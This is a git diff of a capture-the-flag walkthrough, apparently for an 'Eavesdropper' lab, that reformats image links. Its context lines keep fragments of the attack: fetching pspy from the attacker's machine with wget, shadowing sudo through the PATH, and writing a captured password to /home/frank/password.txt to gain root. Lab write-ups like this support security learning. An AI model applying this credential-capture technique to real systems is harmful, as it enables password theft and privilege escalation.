@@ -24,7 +24,7 @@ First Start the machine and download the ssh key. After downloading ssh key, log
 
   
 
-![[Eavesdropper/assets/Untitled.png|Untitled.png]]
+![Untitled.png](Eavesdropper/assets/Untitled.png)
 
   
 
@@ -34,7 +34,7 @@ Download the tool to your local machine. We have to transfer this file from our 
 
   
 
-![[Eavesdropper/assets/Untitled 1.png|Untitled 1.png]]
+![Untitled 1.png](Eavesdropper/assets/Untitled%201.png)
 
   
 
@@ -44,7 +44,7 @@ The command is : `wget http://<tun0-IPaddress>:8000/pspy32`
 
   
 
-![[Eavesdropper/assets/Untitled 2.png|Untitled 2.png]]
+![Untitled 2.png](Eavesdropper/assets/Untitled%202.png)
 
   
 
@@ -52,7 +52,7 @@ Now update the permissions of the pspy tool to executable and run the pspy tool.
 
   
 
-![[Eavesdropper/assets/Untitled 3.png|Untitled 3.png]]
+![Untitled 3.png](Eavesdropper/assets/Untitled%203.png)
 
   
 
@@ -60,7 +60,7 @@ Now take a look at the output of the pspy tool, did you notice anything fishy!!!
 
   
 
-![[Eavesdropper/assets/Untitled 4.png|Untitled 4.png]]
+![Untitled 4.png](Eavesdropper/assets/Untitled%204.png)
 
   
 
@@ -70,7 +70,7 @@ We know that the `sudo` command is located in the `/bin` folder. Take a look at 
 
   
 
-![[Eavesdropper/assets/Untitled 5.png|Untitled 5.png]]
+![Untitled 5.png](Eavesdropper/assets/Untitled%205.png)
 
   
 
@@ -82,7 +82,7 @@ We can take advantage of this characteristic of the Linux system to seek the roo
 
   
 
-![[Eavesdropper/assets/Untitled 6.png|Untitled 6.png]]
+![Untitled 6.png](Eavesdropper/assets/Untitled%206.png)
 
   
 
@@ -100,7 +100,7 @@ echo $password > /home/frank/password.txt
 
   
 
-![[Eavesdropper/assets/Untitled 7.png|Untitled 7.png]]
+![Untitled 7.png](Eavesdropper/assets/Untitled%207.png)
 
   
 
@@ -112,7 +112,7 @@ After completing these steps successfully, if you check the `/home/frank` direct
 
   
 
-![[Eavesdropper/assets/Untitled 8.png|Untitled 8.png]]
+![Untitled 8.png](Eavesdropper/assets/Untitled%208.png)
 
   
 
@@ -120,7 +120,7 @@ Now you got the password for escalating your privileges as the root user. Thus, 
 
   
 
-![[Eavesdropper/assets/Untitled 9.png|Untitled 9.png]]
+![Untitled 9.png](Eavesdropper/assets/Untitled%209.png)
 
   
 
